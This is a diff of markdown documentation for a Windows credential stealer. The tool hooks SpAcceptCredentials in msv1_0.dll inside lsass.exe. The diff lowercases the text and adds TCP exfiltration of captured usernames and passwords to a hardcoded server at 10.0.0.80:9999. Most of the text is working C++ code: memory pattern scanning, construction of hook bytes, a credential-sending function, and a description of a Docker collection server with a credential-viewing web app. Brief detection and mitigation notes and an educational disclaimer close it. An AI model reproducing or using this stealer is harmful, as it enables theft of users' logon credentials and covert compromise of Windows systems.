@@ -1,52 +1,56 @@
-# Technical Documentation - MSV1_0.dll Credential Stealer
+# technical documentation - msv1_0.dll credential stealer
 
-## Table of Contents
-1. [Overview](#overview)
-2. [Library Dependencies](#library-dependencies)
-3. [Assembly Code Analysis](#assembly-code-analysis)
-4. [Function Hooking Mechanism](#function-hooking-mechanism)
-5. [PE Headers and Memory Layout](#pe-headers-and-memory-layout)
-6. [Pattern Scanning](#pattern-scanning)
-7. [Hook Construction](#hook-construction)
-8. [Function Pointer Casting](#function-pointer-casting)
-9. [Complete Execution Flow](#complete-execution-flow)
-10. [Security Considerations](#security-considerations)
+## table of contents
+1. [overview](#overview)
+2. [library dependencies](#library-dependencies)
+3. [assembly code analysis](#assembly-code-analysis)
+4. [function hooking mechanism](#function-hooking-mechanism)
+5. [pe headers and memory layout](#pe-headers-and-memory-layout)
+6. [pattern scanning](#pattern-scanning)
+7. [hook construction](#hook-construction)
+8. [function pointer casting](#function-pointer-casting)
+9. [complete execution flow](#complete-execution-flow)
+10. [security considerations](#security-considerations)
 
-## Overview
+## overview
 
-This credential stealer intercepts clear-text credentials during interactive logons by hooking the `SpAcceptCredentials` function in `msv1_0.dll`. The technique involves:
+this stealer grabs plaintext credentials during windows logins by hooking the `SpAcceptCredentials` function in `msv1_0.dll`. here's what it does:
 
-- **Pattern Scanning**: Finding the target function in memory using byte signatures
-- **Function Hooking**: Patching the function to redirect execution
-- **Credential Interception**: Capturing credentials during authentication
-- **Transparent Operation**: Maintaining system functionality while stealing credentials
+- **pattern scanning**: finds the target function in memory using byte signatures
+- **function hooking**: patches the function to redirect execution to our code
+- **credential interception**: captures usernames and passwords during authentication
+- **network transmission**: sends stolen creds via tcp to a remote server
+- **transparent operation**: keeps the system working normally while stealing credentials
 
-## Library Dependencies
+## library dependencies
 
-### Core Windows Headers
+### core windows headers
 ```cpp
-#include <iostream>      // Standard I/O operations
-#include <Windows.h>     // Windows API functions and types
+#include <iostream>      // standard i/o operations
+#include <Windows.h>     // windows api functions and types
 #include <cstring>       // std::memcpy() for memory operations
+#include <winsock2.h>    // tcp networking for sending credentials
+#include <ws2tcpip.h>    // additional tcp functions
 ```
 
-### Security-Specific Headers
+### security-specific headers
 ```cpp
-#define SECURITY_WIN32   // Enable 32-bit security definitions
-#include <Sspi.h>        // Security Support Provider Interface
-#include <ntsecapi.h>    // NT Security API structures
-#include <ntsecpkg.h>    // NT Security Package structures
+#define SECURITY_WIN32   // enable 32-bit security definitions
+#include <Sspi.h>        // security support provider interface
+#include <ntsecapi.h>    // nt security api structures
+#include <ntsecpkg.h>    // nt security package structures
 ```
 
-**Purpose of Each Header:**
-- **`Sspi.h`**: Provides security structures and authentication functions
-- **`ntsecapi.h`**: Defines `SECURITY_LOGON_TYPE`, `UNICODE_STRING`, and other security types
-- **`ntsecpkg.h`**: Provides `SECPKG_PRIMARY_CRED` and `SECPKG_SUPPLEMENTAL_CRED` structures
-- **`cstring`**: Provides `std::memcpy()` for safe memory copying operations
+**what each header does:**
+- **`Sspi.h`**: provides security structures and authentication functions
+- **`ntsecapi.h`**: defines `SECURITY_LOGON_TYPE`, `UNICODE_STRING`, and other security types
+- **`ntsecpkg.h`**: provides `SECPKG_PRIMARY_CRED` and `SECPKG_SUPPLEMENTAL_CRED` structures
+- **`cstring`**: provides `std::memcpy()` for safe memory copying operations
+- **`winsock2.h`**: tcp networking to send stolen credentials to remote server
 
-## Assembly Code Analysis
+## assembly code analysis
 
-### 1. Target Function Pattern (SpAcceptCredentials Prologue)
+### 1. target function pattern (SpAcceptCredentials prologue)
 
 ```cpp
 char startOfPatternSpAccecptedCredentials[] = { 
@@ -54,74 +58,74 @@ char startOfPatternSpAccecptedCredentials[] = {
 };
 ```
 
-**Assembly Breakdown:**
+**assembly breakdown:**
 ```assembly
-48 83 ec 20    ; sub rsp, 32          ; Allocate 32 bytes on stack
-49 8b d9       ; mov rbx, r9          ; Save 4th parameter (SupplementalCredentials)
-49 8b f8       ; mov rdi, r8          ; Save 3rd parameter (PrimaryCredentials)  
-8b f1          ; mov esi, ecx         ; Save 1st parameter (LogonType)
+48 83 ec 20    ; sub rsp, 32          ; allocate 32 bytes on stack
+49 8b d9       ; mov rbx, r9          ; save 4th parameter (supplementalcredentials)
+49 8b f8       ; mov rdi, r8          ; save 3rd parameter (primarycredentials)  
+8b f1          ; mov esi, ecx         ; save 1st parameter (logontype)
 48             ; (part of next instruction)
 ```
 
-**What This Represents:**
-- **Function Prologue**: Standard x64 function entry point
-- **Stack Allocation**: `sub rsp, 32` allocates local variable space
-- **Parameter Preservation**: Saves function parameters to registers for later use
-- **x64 Calling Convention**: Parameters passed in `rcx`, `rdx`, `r8`, `r9`
+**what this represents:**
+- **function prologue**: standard x64 function entry point
+- **stack allocation**: `sub rsp, 32` allocates local variable space
+- **parameter preservation**: saves function parameters to registers for later use
+- **x64 calling convention**: parameters passed in `rcx`, `rdx`, `r8`, `r9`
 
-### 2. Hook Assembly Code
+### 2. hook assembly code
 
 ```cpp
 char bytesToPatchSpAccecptedCredentials[12] = { 0x48, 0xb8 };
 ```
 
-**Assembly Breakdown:**
+**assembly breakdown:**
 ```assembly
 48 b8 [8-byte-address]  ; mov rax, <64-bit-address-of-hook-function>
 ff e0                    ; jmp rax                    ; jump to hook function
 ```
 
-**What This Does:**
-- **Load Hook Address**: `mov rax, <address>` loads our function address into `rax`
-- **Jump to Hook**: `jmp rax` transfers execution to our hook function
-- **Total Size**: 10 bytes (2 + 8 + 2)
+**what this does:**
+- **load hook address**: `mov rax, <address>` loads our function address into `rax`
+- **jump to hook**: `jmp rax` transfers execution to our hook function
+- **total size**: 10 bytes (2 + 8 + 2)
 
-## Function Hooking Mechanism
+## function hooking mechanism
 
-### How Function Hooking Works
+### how function hooking works
 
-**The Magic of Interception:**
-1. **Original Call**: Windows calls `SpAcceptCredentials(rcx, rdx, r8, r9)`
-2. **Patched Entry**: First instruction is replaced with our hook code
-3. **Execution Redirect**: Instead of normal function prologue, our code executes
-4. **Parameter Preservation**: Same parameters are available to our hook function
-5. **Transparent Operation**: User still logs in successfully
+**the magic of interception:**
+1. **original call**: windows calls `SpAcceptCredentials(rcx, rdx, r8, r9)`
+2. **patched entry**: first instruction is replaced with our hook code
+3. **execution redirect**: instead of normal function prologue, our code executes
+4. **parameter preservation**: same parameters are available to our hook function
+5. **transparent operation**: user still logs in successfully
 
-### Parameter Passing Explanation
+### parameter passing explanation
 
-**Why Our Hook Gets the Right Parameters:**
+**why our hook gets the right parameters:**
 ```cpp
-// Windows calls:
+// windows calls:
 SpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
 
-// But we've patched the entry point to:
+// but we've patched the entry point to:
 mov rax, <hookedSpAccecptedCredentials>
 jmp rax
 
-// Our function receives the SAME parameters:
+// our function receives the same parameters:
 hookedSpAccecptedCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
 ```
 
-**x64 Calling Convention:**
-- `rcx` = 1st parameter (LogonType)
-- `rdx` = 2nd parameter (AccountName)
-- `r8` = 3rd parameter (PrimaryCredentials)
-- `r9` = 4th parameter (SupplementalCredentials)
-- Stack = additional parameters (if any)
+**x64 calling convention:**
+- `rcx` = 1st parameter (logontype)
+- `rdx` = 2nd parameter (accountname)
+- `r8` = 3rd parameter (primarycredentials)
+- `r9` = 4th parameter (supplementalcredentials)
+- stack = additional parameters (if any)
 
-## PE Headers and Memory Layout
+## pe headers and memory layout
 
-### PE File Structure
+### pe file structure
 
 ```cpp
 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetModule;
@@ -129,42 +133,42 @@ PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetModule + dosHe
 SIZE_T sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
 ```
 
-**PE Header Components:**
+**pe header components:**
 
-1. **DOS Header** (`PIMAGE_DOS_HEADER`):
-   - Located at the very beginning of the DLL
-   - Contains `e_lfanew` field pointing to NT header
-   - Legacy compatibility header
+1. **dos header** (`PIMAGE_DOS_HEADER`):
+   - located at the very beginning of the dll
+   - contains `e_lfanew` field pointing to nt header
+   - legacy compatibility header
 
-2. **NT Header** (`PIMAGE_NT_HEADERS`):
-   - Contains file header and optional header
-   - `OptionalHeader.SizeOfImage` = total size of DLL in memory
-   - Critical for determining scan boundaries
+2. **nt header** (`PIMAGE_NT_HEADERS`):
+   - contains file header and optional header
+   - `OptionalHeader.SizeOfImage` = total size of dll in memory
+   - critical for determining scan boundaries
 
-**Memory Layout:**
+**memory layout:**
 ```
-msv1_0.dll in Memory:
+msv1_0.dll in memory:
 ┌─────────────────┐
-│   DOS Header    │ ← targetModule
+│   dos header    │ ← targetmodule
 ├─────────────────┤
-│   NT Header     │ ← targetModule + e_lfanew
+│   nt header     │ ← targetmodule + e_lfanew
 ├─────────────────┤
-│   Code Section  │ ← Where we scan for patterns
+│   code section  │ ← where we scan for patterns
 ├─────────────────┤
-│   Data Section  │
+│   data section  │
 ├─────────────────┤
 │   ...           │
-└─────────────────┘ ← targetModule + SizeOfImage
+└─────────────────┘ ← targetmodule + sizeofimage
 ```
 
-**Why We Need SizeOfImage:**
-- **Scan Boundaries**: Pattern scanner needs to know where to stop
-- **Memory Safety**: Prevents scanning beyond DLL boundaries
-- **Efficiency**: Avoids unnecessary memory access
+**why we need sizeofimage:**
+- **scan boundaries**: pattern scanner needs to know where to stop
+- **memory safety**: prevents scanning beyond dll boundaries
+- **efficiency**: avoids unnecessary memory access
 
-## Pattern Scanning
+## pattern scanning
 
-### Pattern Matching Algorithm
+### pattern matching algorithm
 
 ```cpp
 PVOID GetPatternMemoryAddress(char *startAddress, char *pattern, SIZE_T patternSize, SIZE_T searchBytes)
@@ -197,224 +201,277 @@ PVOID GetPatternMemoryAddress(char *startAddress, char *pattern, SIZE_T patternS
 }
 ```
 
-**Algorithm Steps:**
-1. **Linear Scan**: Search through memory byte by byte
-2. **First Byte Match**: Look for first byte of pattern
-3. **Full Pattern Check**: If first byte matches, check remaining bytes
-4. **Return Address**: Return address of pattern start if found
+**algorithm steps:**
+1. **linear scan**: search through memory byte by byte
+2. **first byte match**: look for first byte of pattern
+3. **full pattern check**: if first byte matches, check remaining bytes
+4. **return address**: return address of pattern start if found
 
-**Pattern Location Calculation:**
+**pattern location calculation:**
 ```cpp
 patternStartAddressOfSpAccecptedCredentials = GetPatternMemoryAddress(...);
 addressOfSpAcceptCredentials = (LPVOID)((DWORD_PTR)patternStartAddressOfSpAccecptedCredentials - 16);
 ```
 
-**Why -16:**
-- Pattern is found **inside** the function
-- Function entry point is 16 bytes **before** the pattern
-- This gives us the actual function start address
+**why -16:**
+- pattern is found **inside** the function
+- function entry point is 16 bytes **before** the pattern
+- this gives us the actual function start address
 
-## Hook Construction
+## credential transmission
 
-### Step-by-Step Assembly Building
+### tcp client implementation
 
-**Step 1: Backup Original Function**
+the stealer sends credentials via tcp to a remote server instead of writing to disk:
+
+```cpp
+BOOL SendCredentials(const wchar_t* username, const wchar_t* password)
+{
+    // convert unicode to ascii for transmission
+    char username_ascii[256] = {0};
+    char password_ascii[256] = {0};
+    WideCharToMultiByte(CP_UTF8, 0, username, -1, username_ascii, 256, NULL, NULL);
+    WideCharToMultiByte(CP_UTF8, 0, password, -1, password_ascii, 256, NULL, NULL);
+    
+    // format exactly like netcat: "username:password"
+    char msg[512];
+    sprintf_s(msg, sizeof(msg), "%s:%s", username_ascii, password_ascii);
+    
+    // tcp connection to 10.0.0.80:9999
+    // ... socket code ...
+}
+```
+
+**transmission details:**
+- **format**: `username:password` (simple colon-separated)
+- **target**: hardcoded to `10.0.0.80:9999`
+- **protocol**: raw tcp socket connection
+- **encoding**: utf-8 for international characters
+- **behavior**: fire-and-forget (no error handling for network failures)
+
+### docker-based server
+
+the receiving server runs in a docker container with two components:
+
+**server.py** (port 9999):
+- listens for tcp connections from the dll
+- parses `username:password` format
+- saves credentials to `creds.json` with timestamps and source ip
+
+**webapp.py** (port 8080):
+- flask web interface to view captured credentials
+- login protected (password: `BallsInYourFace69!`)
+- provides json api and web ui for credential review
+- allows filtering by source ip address
+
+## hook construction
+
+### step-by-step assembly building
+
+**step 1: backup original function**
 ```cpp
 std::memcpy(bytesToRestoreSpAccecptedCredentials, addressOfSpAcceptCredentials, sizeof(bytesToRestoreSpAccecptedCredentials));
 ```
-- **Purpose**: Save original 12 bytes for later restoration
-- **Why**: Need to temporarily "unhook" to call original function
+- **purpose**: save original 12 bytes for later restoration
+- **why**: need to temporarily "unhook" to call original function
 
-**Step 2: Build Hook Assembly**
+**step 2: build hook assembly**
 ```cpp
 char bytesToPatchSpAccecptedCredentials[12] = { 0x48, 0xb8 };
 ```
-- **Initial State**: `[48, b8, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00]`
-- **Assembly**: `mov rax, <placeholder-address>`
+- **initial state**: `[48, b8, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00]`
+- **assembly**: `mov rax, <placeholder-address>`
 
-**Step 3: Insert Function Address**
+**step 3: insert function address**
 ```cpp
 DWORD_PTR addressBytesOfhookedSpAccecptedCredentials = (DWORD_PTR)&hookedSpAccecptedCredentials;
 std::memcpy(bytesToPatchSpAccecptedCredentials + 2, &addressBytesOfhookedSpAccecptedCredentials, sizeof(&addressBytesOfhookedSpAccecptedCredentials));
 ```
-- **Why +2**: Skip `mov rax` instruction (2 bytes: `48 b8`)
-- **Result**: `[48, b8, <8-byte-address>, 00, 00, 00, 00]`
+- **why +2**: skip `mov rax` instruction (2 bytes: `48 b8`)
+- **result**: `[48, b8, <8-byte-address>, 00, 00, 00, 00]`
 
-**Step 4: Add Jump Instruction**
+**step 4: add jump instruction**
 ```cpp
 std::memcpy(bytesToPatchSpAccecptedCredentials + 2 + sizeof(&addressBytesOfhookedSpAccecptedCredentials), (PVOID)&"\xff\xe0", 2);
 ```
-- **Why +2 + 8**: Skip `mov rax` (2) + address (8) = position 10
-- **Result**: `[48, b8, <8-byte-address>, ff, e0, 00, 00]`
-- **Assembly**: `mov rax, <address>; jmp rax`
+- **why +2 + 8**: skip `mov rax` (2) + address (8) = position 10
+- **result**: `[48, b8, <8-byte-address>, ff, e0, 00, 00]`
+- **assembly**: `mov rax, <address>; jmp rax`
 
-**Final Assembly:**
+**final assembly:**
 ```assembly
-mov rax, <hookedSpAccecptedCredentials>  ; Load our function address
-jmp rax                                  ; Jump to our function
+mov rax, <hookedSpAccecptedCredentials>  ; load our function address
+jmp rax                                  ; jump to our function
 ```
 
-## Function Pointer Casting
+## function pointer casting
 
-### The Casting Mechanism
+### the casting mechanism
 
 ```cpp
 _SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;
 ```
 
-**What's Happening:**
+**what's happening:**
 - `addressOfSpAcceptCredentials` = `PVOID` (raw memory address)
 - `_SpAcceptCredentials` = function pointer type
-- **Cast**: Convert raw address to callable function pointer
+- **cast**: convert raw address to callable function pointer
 
-**Function Pointer Type Definition:**
+**function pointer type definition:**
 ```cpp
 using _SpAcceptCredentials = NTSTATUS(NTAPI *)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);
 ```
 
-**Why This Works:**
-- **Same Signature**: Our hook and original have identical signatures
-- **Same Calling Convention**: Both use `NTAPI` (`__stdcall` on x64)
-- **Parameter Compatibility**: Same parameter types and order
+**why this works:**
+- **same signature**: our hook and original have identical signatures
+- **same calling convention**: both use `NTAPI` (`__stdcall` on x64)
+- **parameter compatibility**: same parameter types and order
 
-**Usage:**
+**usage:**
 ```cpp
-// Can't call raw address:
-addressOfSpAcceptCredentials(params); // ERROR!
+// can't call raw address:
+addressOfSpAcceptCredentials(params); // error!
 
-// Can call function pointer:
-originalSpAcceptCredentials(params); // WORKS!
+// can call function pointer:
+originalSpAcceptCredentials(params); // works!
 ```
 
-## Complete Execution Flow
+## complete execution flow
 
-### 1. DLL Injection Phase
+### 1. dll injection phase
 ```
-DLL injected into lsass.exe
+dll injected into lsass.exe
 ↓
-DllMain(DLL_PROCESS_ATTACH) called
+dllmain(dll_process_attach) called
 ↓
-installSpAccecptedCredentialsHook() called
-```
-
-### 2. Hook Installation Phase
-```
-GetModuleHandleA("msv1_0.dll")
-↓
-Parse PE headers for SizeOfImage
-↓
-Scan for SpAcceptCredentials pattern
-↓
-Calculate function entry point (pattern - 16)
-↓
-Backup original 12 bytes
-↓
-Build hook assembly (mov rax, <hook>; jmp rax)
-↓
-Write hook to function entry point
+installspaccecptedcredentialshook() called
 ```
 
-### 3. Credential Interception Phase
+### 2. hook installation phase
 ```
-User attempts interactive logon
+getmodulehandlea("msv1_0.dll")
 ↓
-Windows calls SpAcceptCredentials
+parse pe headers for sizeofimage
 ↓
-Our hook executes instead
+scan for spacceptcredentials pattern
 ↓
-Capture credentials to file
+calculate function entry point (pattern - 16)
 ↓
-Temporarily restore original function
+backup original 12 bytes
 ↓
-Call original SpAcceptCredentials
+build hook assembly (mov rax, <hook>; jmp rax)
 ↓
-User logs in successfully
-↓
-Reinstall hook after delay
+write hook to function entry point
 ```
 
-### 4. Hook Reinstallation Phase
+### 3. credential interception phase
 ```
-CreateThread(installSpAccecptedCredentialsHook)
+user attempts interactive logon
 ↓
-Sleep(5000ms) - allow original to complete
+windows calls spacceptcredentials
 ↓
-Reinstall hook for next login
+our hook executes instead
+↓
+extract username and password from parameters
+↓
+send credentials via tcp to remote server
+↓
+temporarily restore original function
+↓
+call original spacceptcredentials
+↓
+user logs in successfully
+↓
+reinstall hook after delay
 ```
 
-## Security Considerations
+### 4. hook reinstallation phase
+```
+createthread(installspaccecptedcredentialshook)
+↓
+sleep(5000ms) - allow original to complete
+↓
+reinstall hook for next login
+```
 
-### Detection Methods
+## security considerations
 
-**Memory Scanning:**
-- Look for hooked functions in `msv1_0.dll`
-- Detect `mov rax, <address>; jmp rax` patterns
-- Monitor for function entry point modifications
+### detection methods
 
-**File Monitoring:**
-- Monitor `c:\temp\credentials.txt`
-- Detect credential file creation
-- Watch for unusual file access patterns
+**memory scanning:**
+- look for hooked functions in `msv1_0.dll`
+- detect `mov rax, <address>; jmp rax` patterns
+- monitor for function entry point modifications
 
-**Process Injection Detection:**
-- Detect DLL injection into LSASS
-- Monitor for suspicious process modifications
-- Alert on unauthorized LSASS access
+**network monitoring:**
+- watch for tcp connections from lsass.exe
+- monitor traffic to suspicious ips/ports
+- detect unusual network activity from system processes
 
-### Mitigation Strategies
+**process injection detection:**
+- detect dll injection into lsass
+- monitor for suspicious process modifications
+- alert on unauthorized lsass access
 
-**Credential Guard:**
-- Prevents credential theft in memory
-- Isolates LSASS from user mode processes
-- Requires UEFI Secure Boot
+### mitigation strategies
 
-**LSA Protection:**
-- Protects LSASS from injection
-- Requires administrative privileges to disable
-- Monitors for unauthorized modifications
+**credential guard:**
+- prevents credential theft in memory
+- isolates lsass from user mode processes
+- requires uefi secure boot
 
-**Memory Protection:**
-- DEP (Data Execution Prevention)
-- ASLR (Address Space Layout Randomization)
-- CFG (Control Flow Guard)
+**lsa protection:**
+- protects lsass from injection
+- requires administrative privileges to disable
+- monitors for unauthorized modifications
 
-### Limitations
+**memory protection:**
+- dep (data execution prevention)
+- aslr (address space layout randomization)
+- cfg (control flow guard)
 
-**Windows Version Dependencies:**
-- Pattern signatures may change between Windows versions
-- Function offsets can vary
-- PE header structures may differ
+### limitations
 
-**Antivirus Detection:**
-- Modern EDR solutions detect this technique
-- Memory scanning can identify hooks
-- Behavioral analysis flags suspicious activity
+**windows version dependencies:**
+- pattern signatures may change between windows versions
+- function offsets can vary
+- pe header structures may differ
 
-**Stability Risks:**
-- Hooking system functions can cause instability
-- Race conditions during hook/unhook cycles
-- Potential for system crashes if not implemented carefully
+**antivirus detection:**
+- modern edr solutions detect this technique
+- memory scanning can identify hooks
+- behavioral analysis flags suspicious activity
 
-## Technical Notes
+**network dependencies:**
+- requires network connectivity to exfiltrate credentials
+- hardcoded server ip makes it easy to block
+- tcp connections from lsass.exe are suspicious
 
-### Architecture Requirements
-- **Target**: x64 Windows systems only
-- **Dependencies**: Windows Security APIs
-- **Memory Permissions**: Requires RWX memory for hooking
-- **Privileges**: Administrative access required
+**stability risks:**
+- hooking system functions can cause instability
+- race conditions during hook/unhook cycles
+- potential for system crashes if not implemented carefully
 
-### Performance Impact
-- **Minimal**: Hook adds negligible overhead
-- **Memory**: Small memory footprint for hook code
-- **CPU**: Pattern scanning is O(n) but only done once
-- **I/O**: Only file writes when credentials are captured
+## technical notes
 
-### Reliability Considerations
-- **Error Handling**: Graceful fallbacks for failed operations
-- **Thread Safety**: Delay-based re-hooking prevents race conditions
-- **Memory Safety**: Proper bounds checking in pattern scanning
-- **File Operations**: Error handling for file creation/writing
+### architecture requirements
+- **target**: x64 windows systems only
+- **dependencies**: windows security apis, winsock2
+- **memory permissions**: requires rwx memory for hooking
+- **privileges**: administrative access required
+
+### performance impact
+- **minimal**: hook adds negligible overhead
+- **memory**: small memory footprint for hook code
+- **cpu**: pattern scanning is o(n) but only done once
+- **network**: tcp connection overhead when credentials are captured
+
+### reliability considerations
+- **error handling**: graceful fallbacks for failed operations
+- **thread safety**: delay-based re-hooking prevents race conditions
+- **memory safety**: proper bounds checking in pattern scanning
+- **network operations**: fire-and-forget tcp transmission (no error handling)
 
 ---
 
-**Disclaimer**: This documentation is for educational purposes only. The techniques described should only be used in authorized testing environments with proper permissions. 
+**disclaimer**: this documentation is for educational purposes only. the techniques described should only be used in authorized testing environments with proper permissions. 
